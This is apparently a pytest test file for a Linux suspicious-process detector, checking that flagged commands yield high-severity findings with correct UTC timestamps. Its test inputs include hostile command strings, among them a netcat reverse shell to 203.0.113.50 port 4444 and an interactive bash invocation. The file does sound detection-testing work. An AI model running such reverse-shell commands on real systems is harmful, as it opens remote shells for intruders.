from src.detection.linux.detection_context import LinuxDetectionContext
from src.detection.linux.suspicious_process_detector import (
    detect_suspicious_linux_processes,)
from src.models.linux_process_execution import LinuxProcessExecution


class FakeLinuxEvent:
    def __init__(
        self,
        command="",
        process="",
        user="",
        source_ip="",
        hostname="ubuntu-server",
        timestamp="Jul 7 10:00:01",
        message="",
        raw_log="",
    ):
        self.command = command
        self.process = process
        self.user = user
        self.source_ip = source_ip
        self.hostname = hostname
        self.timestamp = timestamp
        self.message = message
        self.raw_log = raw_log


def create_execution(command: str) -> LinuxProcessExecution:
    event = FakeLinuxEvent(
        command=command,
        process=command.split()[0],
        user="root",
        source_ip="203.0.113.50",
    )

    context = LinuxDetectionContext.from_event(event)

    return LinuxProcessExecution.from_context(context)


def test_detect_bash_execution():
    executions = [create_execution("/bin/bash -i")]

    findings = detect_suspicious_linux_processes(executions)

    assert len(findings) == 1
    assert findings[0].title == "Suspicious Linux Process Execution Detected"
    assert findings[0].severity == "high"
    assert findings[0].source == "Linux Host Detection"


def test_detect_python_command_execution():
    executions = [create_execution("python3 -c import socket")]

    findings = detect_suspicious_linux_processes(executions)

    assert len(findings) == 1


def test_detect_execution_from_tmp_path():
    executions = [create_execution("/tmp/payload.sh")]

    findings = detect_suspicious_linux_processes(executions)

    assert len(findings) == 1


def test_detect_netcat_execution():
    executions = [create_execution("nc -e /bin/sh 203.0.113.50 4444")]

    findings = detect_suspicious_linux_processes(executions)

    assert len(findings) == 1


def test_ignore_normal_process_execution():
    executions = [create_execution("/usr/bin/apt update")]

    findings = detect_suspicious_linux_processes(executions)

    assert findings == []


def test_ignore_empty_executions():
    findings = detect_suspicious_linux_processes([])

    assert findings == []


def test_suspicious_process_finding_preserves_utc_time():
    execution = create_execution("/bin/bash -i")
    execution.timestamp_utc = (
        "2026-07-07T07:00:01.123456789+00:00"
    )

    original_timestamp = execution.timestamp

    findings = detect_suspicious_linux_processes(
        [execution]
    )

    assert len(findings) == 1

    finding = findings[0]

    assert finding.title == (
        "Suspicious Linux Process Execution Detected"
    )
    assert finding.first_seen == (
        "2026-07-07T07:00:01.123456789+00:00"
    )
    assert finding.last_seen == (
        "2026-07-07T07:00:01.123456789+00:00"
    )

    # Original syslog timestamp must remain unchanged.
    assert execution.timestamp == original_timestamp
    assert execution.timestamp == "Jul 7 10:00:01"


def test_suspicious_process_does_not_invent_unknown_time():
    execution = create_execution(
        "python3 -c import socket"
    )

    assert execution.timestamp_utc is None

    findings = detect_suspicious_linux_processes(
        [execution]
    )

    assert len(findings) == 1
    assert findings[0].first_seen is None
    assert findings[0].last_seen is None


def test_suspicious_process_rejects_invalid_utc_time():
    execution = create_execution(
        "nc -e /bin/sh 203.0.113.50 4444"
    )
    execution.timestamp_utc = "invalid timestamp"

    findings = detect_suspicious_linux_processes(
        [execution]
    )

    assert len(findings) == 1
    assert findings[0].first_seen is None
    assert findings[0].last_seen is None
